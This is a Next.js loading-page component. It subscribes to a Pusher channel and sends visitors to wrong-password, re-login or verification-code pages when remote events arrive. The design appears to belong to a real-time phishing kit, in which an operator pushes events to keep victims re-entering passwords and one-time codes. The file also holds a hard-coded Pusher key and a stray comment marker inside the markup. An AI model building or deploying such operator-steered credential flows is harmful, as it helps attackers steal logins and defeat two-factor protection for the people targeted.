// import React from 'react'

// function page() {
//   return (
//     <div className=" mt-[300px]">
//         <div class="flex flex-col items-center ">
	
// 	<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
// 		<circle class="opacity-25" stroke="currentColor" stroke-width="4" cx="12" cy="12" r="10"></circle>
// 		<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
// 	</svg>
// </div>


//     </div>
//   )
// }

// export default page




"use client";
import { useEffect, useState } from 'react';
import { useRouter } from "next/navigation";
import Pusher from "pusher-js";
import Cookies from 'js-cookie';
function Loading() {
  const router = useRouter()
  const[wrongPasswordId, setWrongPasswordId] = useState('');
  const[wrongMailId, setWrongMailId] = useState('');

  const[verifyId, setVerifyId] = useState('');
  const[ReverifyId, setReVerifyId] = useState('');
  console.log(wrongPasswordId)
  const id = Cookies.get("id");
  const pusher = new Pusher("7ceaf0e1db0706ddfe8d", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });

  useEffect(() => {
    if (!id) return;
    const channel = pusher.subscribe(id);

    channel.bind('pass-wrong', (data) => {
      console.log('Path data updated pass-wrong:', data);
      setWrongPasswordId(data.id);
    });

    channel.bind('email-wrong', (data) => {
      console.log('Path data updated email-wrong:', data);
      setWrongMailId(data.id);
    });

    channel.bind('code-verify', (data) => {
      console.log('Path data updated code-verify:', data);
      Cookies.set("code", data.code);
      setVerifyId(data.id);
    });

    channel.bind('code-re-verify', (data) => {
      console.log('Path data updated code-re-verify:', data);
      Cookies.set("code", data.code);
      setReVerifyId(data.id);
    });

    return () => {
      channel.unbind('pass-wrong');
      channel.unbind('email-wrong');
      channel.unbind('code-verify');
      channel.unbind('code-re-verify');
      pusher.unsubscribe(id);
    };
  }, [id]);

  if (wrongMailId) {
    return router.push(`/login`);
  }
  if (wrongPasswordId) {
    return router.push(`/wrongPassword`);
  }
  if (verifyId) {
    return router.push(`/verifyCode`);
  }
  if (ReverifyId) {
    return router.push(`/reVerifyCode`);
  }
  return (
    
      <div className=" mt-[300px]">
        <div class="flex flex-col items-center ">
	
 	<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
		<circle class="opacity-25" stroke="currentColor" stroke-width="4" cx="12" cy="12" r="10"></circle>
// 		<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
 	</svg>
 </div>


   </div>
  
  );
}
 export default Loading;
